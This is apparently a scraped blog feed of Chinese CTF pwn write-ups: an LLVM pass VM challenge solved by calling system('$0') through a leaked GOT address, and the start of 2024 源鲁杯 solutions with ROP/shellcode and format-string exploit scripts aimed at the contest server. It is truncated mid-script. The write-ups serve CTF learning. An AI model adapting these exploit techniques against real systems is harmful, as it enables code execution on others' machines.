llvm::operator&#x3D;&#x3D;(Name, v8, v6[0], v6[1]);  std::string::~string(v5);  if ( (v4 &amp; 1) !&#x3D; 0 )    &#96;anonymous namespace&#39;::c0oo0o0Ode::vmRun(this, v9);  return 0LL;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接随便写一个函数名动态调试，传入参数的指令是<code>set args -load codeVM.so -Co00o0oOd3 exp.ll -f</code>，运行完初始化函数之后通过<code>vmmap</code>找到<code>codeVM.so</code>的基址</p><pre class="line-numbers language-none"><code class="language-none">0x7ffff1f88000     0x7ffff1fa0000 r--p    18000      0 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fa0000     0x7ffff1fb0000 r-xp    10000  18000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fb0000     0x7ffff1fb8000 r--p     8000  28000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fb8000     0x7ffff1fb9000 r--p     1000  2f000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fb9000     0x7ffff1fbb000 rw-p     2000  30000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>下断点观察函数名，测试程序中我的函数名是<code>testname</code>，在比较时输入的函数名变成了<code>_Z8testnamev</code>，即头部+长度+函数名+<code>v</code>，比较对象函数名<code>_Z10c0deVmMainv</code>，所以入口函数的函数名就是<code>c0deVmMain</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">► 0x7ffff1fa3242 &lt;(anonymous namespace)::c0oo0o0Ode::runOnFunction(llvm::Function&amp;)+98&gt;     call   llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt                &lt;llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt&gt;        rdi: 0x4e5510 ◂— &#39;_Z8testnamev&#39;        rsi: 0xc        rdx: 0x7fffffffd390 ◂— &#39;_Z10c0deVmMainv&#39;        rcx: 0xf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序的基本结构如下，其他操作都写在<code>c0deVmMain</code>中</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int c0deVmMain() &#123;        return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过比较之后会进入&#96;&#96;anonymous namespace’::c0oo0o0Ode::vmRun(this, v9);<code>，这个函数中存在</code>8<code>个</code>op<code>，在每个</code>op<code>之前通过</code>anonymous namespace’::c0oo0o0Ode::isValidOp(this, &amp;v15, v6) &amp; 1) !&#x3D; 0<code>判定函数名是否符合，同样函数中存在</code>llvm::Value::getName(v12)<code>和</code>llvm::operator&#x3D;&#x3D;(Name, v11, v9[0], v9[1], v4, v5);&#96;，也是任意写一个函数定位到这里判断函数名</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall &#96;anonymous namespace&#39;::c0oo0o0Ode::isValidOp(__int64 a1, __int64 a2, __int64 a3)&#123;  __int64 v3; &#x2F;&#x2F; rdx  __int64 v4; &#x2F;&#x2F; r8  __int64 v5; &#x2F;&#x2F; r9  char v7; &#x2F;&#x2F; [rsp+Fh] [rbp-81h]  _BYTE v8[32]; &#x2F;&#x2F; [rsp+18h] [rbp-78h] BYREF  __int64 v9[2]; &#x2F;&#x2F; [rsp+38h] [rbp-58h] BYREF  __int64 Name; &#x2F;&#x2F; [rsp+48h] [rbp-48h]  __int64 v11; &#x2F;&#x2F; [rsp+50h] [rbp-40h]  llvm::Value *v12; &#x2F;&#x2F; [rsp+58h] [rbp-38h]  __int64 CalledOperand; &#x2F;&#x2F; [rsp+60h] [rbp-30h]  llvm::CallBase *v14; &#x2F;&#x2F; [rsp+68h] [rbp-28h]  __int64 v15; &#x2F;&#x2F; [rsp+70h] [rbp-20h]  __int64 v16; &#x2F;&#x2F; [rsp+78h] [rbp-18h]  __int64 v17; &#x2F;&#x2F; [rsp+80h] [rbp-10h]  char v18; &#x2F;&#x2F; [rsp+8Fh] [rbp-1h]  v17 &#x3D; a1;  v16 &#x3D; a2;  v15 &#x3D; a3;  v14 &#x3D; (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,true&gt;&gt;(a2);  if ( !v14 )    goto LABEL_6;  CalledOperand &#x3D; llvm::CallBase::getCalledOperand(v14);  v12 &#x3D; (llvm::Value *)llvm::dyn_cast&lt;llvm::Function,llvm::Value&gt;(CalledOperand);  if ( !v12 )    goto LABEL_6;  Name &#x3D; llvm::Value::getName(v12);  v11 &#x3D; v3;  VMDatProt::getStrFromProt2((__int64)v8, v15, (__int64)&amp;secret::vmKey[abi:cxx11]);  llvm::StringRef::StringRef(v9, (__int64)v8);  v7 &#x3D; llvm::operator&#x3D;&#x3D;(Name, v11, v9[0], v9[1], v4, v5);  std::string::~string(v8);  if ( (v7 &amp; 1) !&#x3D; 0 &amp;&amp; (&#96;anonymous namespace&#39;::c0oo0o0Ode::isValidEnv(a1, v16) &amp; 1) !&#x3D; 0 )    v18 &#x3D; 1;  elseLABEL_6:    v18 &#x3D; 0;  return v18 &amp; 1;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我的测试函数名是<code>testfunction</code>，运行到断点观察输入函数名变成<code>_Z12testfunctionv</code>，而比较函数名<code>_ZN4edoc4addiEhii</code>，根据<code>c++</code>函数名修饰规则可以分析到该函数是位于<code>edoc</code>类下的<code>addi</code>函数，参数类型是<code>unsigned char</code>、<code>int</code>、<code>int</code> </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">► 0x7ffff1fa362e &lt;(anonymous namespace)::c0oo0o0Ode::isValidOp(llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, false, false, void&gt;, false, true&gt;&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;)+158&gt;    call   llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt                &lt;llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt&gt;        rdi: 0x4e55e0 ◂— &#39;_Z12testfunctionv&#39;        rsi: 0x11        rdx: 0x4ce0c0 ◂— &#39;_ZN4edoc4addiEhii&#39;        rcx: 0x11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样，运行到每个<code>op</code>前的&#96;&#96;anonymous namespace’::c0oo0o0Ode::isValidOp&#96;函数记录每个函数的函数名，得到以下交互脚本</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class edoc &#123;public:    void addi(unsigned char x, int y, int z) &#123;&#125;      void chgr(unsigned char x, int y) &#123;&#125;                      void sftr(unsigned char x, bool y, unsigned char z) &#123;&#125;           void borr(unsigned char x, unsigned char y, unsigned char z) &#123;&#125;     void movr(unsigned char x, unsigned char y) &#123;&#125;                     void save(unsigned char x, unsigned int  y) &#123;&#125;                  void load(unsigned char x, unsigned int y) &#123;&#125;                  void runc(unsigned char x, unsigned int  y) &#123;&#125;                &#125;;edoc obj;int c0deVmMain() &#123;        return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>对每个功能进行逆向分析，分析过程不多描述，分析结果如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">addi -&gt; regs[x] &#x3D; y + z                                   ;x &lt;&#x3D; 5chgr -&gt; regs[x] +&#x3D; y                                    ;x &lt;&#x3D; 5                  -0x1000 &lt; y &lt; 0x1000    onetimesftr -&gt; if y &#x3D;&#x3D; 1 : regs[x] &lt;&lt; z, if y &#x3D;&#x3D; 0 : regs[x] &gt;&gt; z      ;x &lt;&#x3D; 5  y &lt; 0x40borr -&gt; regs[x] &#x3D; regs[y] | regs[z]                        ;x &lt;&#x3D; 5  y &lt;&#x3D; 5  z &lt;&#x3D; 5movr -&gt; regs[x] &#x3D; regs[y]                                  ;x &lt; 8  y &lt; 8save -&gt; *(y+regs[6]) &#x3D; regs[x]                             ;x &lt;&#x3D; 5  y &lt;&#x3D; 0x1000     y &amp; 7 &#x3D;&#x3D; 0      regs[6] &amp; 0xFFF &#x3D; 0     regs[7] &#x3D; regs[6] + 0x1000load -&gt; regs[x] &#x3D; *(y+regs[6])                             ;x &lt;&#x3D; 5  y &lt;&#x3D; 0x1000     y &amp; 7 &#x3D;&#x3D; 0      regs[6] &amp; 0xFFF &#x3D; 0     regs[7] &#x3D; regs[6] + 0x1000runc -&gt; *(y+regs[6])(regs[x])                              ;x &lt;&#x3D; 5  y &lt;&#x3D; 0x1000     y &amp; 7 &#x3D;&#x3D; 0      regs[6] &amp; 0xFFF &#x3D; 0     regs[7] &#x3D; regs[6] + 0x1000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用思路就是用<code>op7</code>获取一个<code>libc</code>上的地址，用<code>op8</code>执行<code>system(&#39;$0&#39;)</code>，<code>opt-12</code>程序没有开启<code>pie</code>，所以可以直接获取<code>opt-12</code>中的<code>got</code>表里的<code>libc</code>地址，离<code>system</code>最近的就是<code>0x442ad8</code>中的<code>getenv_got</code>，再通过左移右移或运算得到<code>system</code>地址，本地<code>getenv</code>和<code>system</code>地址如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/gx 0x442ad80x442ad8 <span class="token operator">&lt;</span>getenv@got<span class="token punctuation">[</span>plt<span class="token punctuation">]</span><span class="token operator">></span>:0x00007ffff1c44b70pwndbg<span class="token operator">></span> p system<span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">&lt;</span>text variable, no debug info<span class="token operator">></span><span class="token punctuation">&#125;</span> 0x7ffff1c50d70 <span class="token operator">&lt;</span>system<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我的思路是将<code>getenv</code>右移<code>16</code>位再左移<code>16</code>位清空最后两个字节为<code>0x00007ffff1c40000</code>，第五位使用<code>op2</code>来加<code>1</code>为<code>0x00007ffff1c50000</code>，再用<code>op3</code>改末三位为<code>0x00007ffff1c50d70</code>，由于<code>libc</code>只有末三位固定剩下是随机的，所以第四位需要爆破</p><p>exp</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class edoc &#123;public:    void addi(unsigned char x, int y, int z) &#123;&#125;                                     void chgr(unsigned char x, int y) &#123;&#125;    void sftr(unsigned char x, bool y, unsigned char z) &#123;&#125;    void borr(unsigned char x, unsigned char y, unsigned char z) &#123;&#125;     void movr(unsigned char x, unsigned char y) &#123;&#125;     void save(unsigned char x, unsigned int  y) &#123;&#125;     void load(unsigned char x, unsigned int y) &#123;&#125;     void runc(unsigned char x, unsigned int  y) &#123;&#125;  &#125;;edoc obj;void testfunction()&#123;&#125;int c0deVmMain() &#123;        obj.addi(0, 0x442000, 0);        obj.movr(6, 0);        obj.addi(1, 0x443000, 0);        obj.movr(7, 1);&#x2F;&#x2F;regs[7] &#x3D; regs[6] + 0x1000        obj.load(2, 0xad8);    &#x2F;&#x2F;load(0x4420xad8): regs[2] &#x3D; getenv_addr        obj.sftr(2, 0, 16);                             obj.sftr(2, 1, 12);        obj.addi(5, 0x400, 0);        obj.borr(2, 2, 5);        obj.chgr(2, 0xc00);        obj.sftr(2, 1, 4);&#x2F;&#x2F;Sets the lower two bytes to null and increments the third last byte by 1        obj.addi(4, 0xd70, 0);        obj.borr(2, 2, 4);&#x2F;&#x2F;clear and add            obj.addi(4, 0x3024, 0);        obj.save(4, 0x1000);&#x2F;&#x2F;save $0        obj.save(2, 0xb00);&#x2F;&#x2F;save system        obj.runc(1, 0xb00);&#x2F;&#x2F;system(&#39;$0&#39;)        return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆破脚本，大概30+次爆破出来的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"exp.ll"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">+=</span> <span class="token string">b'\nEOF\n'</span>rnd <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">43319</span><span class="token punctuation">)</span>        rnd <span class="token operator">+=</span> <span class="token number">1</span>        li<span class="token punctuation">(</span><span class="token string">'the '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rnd<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' round'</span><span class="token punctuation">)</span>        r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'(EOF to stop):\n'</span><span class="token punctuation">)</span>        r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'cat flag'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            s <span class="token operator">=</span> r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'YLCTF'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>            li<span class="token punctuation">(</span>s<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://www.z1r0.top/2022/10/28/LLVM-PASS-PWN/">https://www.z1r0.top/2022/10/28/LLVM-PASS-PWN/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近比赛中遇到一道&lt;code&gt;llvm pass pwn&lt;/code&gt;，现学了一下相关知识，发现网上的讲解和例题的&lt;code&gt;exp&lt;/co</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="llvm" scheme="https://starrysky1004.github.io/tags/llvm/"/>
    
  </entry>
  
  <entry>
    <title>2024源鲁杯pwn方向题解</title>
    <link href="https://starrysky1004.github.io/2024/10/25/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/"/>
    <id>https://starrysky1004.github.io/2024/10/25/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/</id>
    <published>2024-10-25T08:41:16.000Z</published>
    <updated>2024-10-25T09:07:17.938Z</updated>
    
    <content type="html"><![CDATA[<h2 id="round1"><a href="#round1" class="headerlink" title="round1"></a>round1</h2><h3 id="canary-orw"><a href="#canary-orw" class="headerlink" title="canary_orw"></a>canary_orw</h3><p>再次运行到<code>vuln</code>使得<code>rsp</code>增加，最后<code>jmp rsp</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">46543</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>vuln <span class="token operator">=</span> <span class="token number">0x400821</span>pop_rbp_ret <span class="token operator">=</span> <span class="token number">0x40081E</span>jmp_rsp <span class="token operator">=</span> <span class="token number">0x40081B</span>check <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x601100</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x601100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'journey'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Sea'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'magic'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x40086D</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'go'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'magic'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'go'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'magic'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'go'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x90'</span> <span class="token operator">*</span> <span class="token number">0x30</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezfmt"><a href="#ezfmt" class="headerlink" title="ezfmt"></a>ezfmt</h3><p>改<code>put_got</code>为<code>ogg</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">39131</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>vuln <span class="token operator">=</span> <span class="token number">0x4011FB</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>puts <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'%13$p'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x24083</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseogg1 <span class="token operator">=</span> ogg <span class="token operator">&amp;</span> <span class="token number">0xff</span>ogg2 <span class="token operator">=</span> <span class="token punctuation">(</span>ogg<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>p <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ogg1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%8$hhn'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token 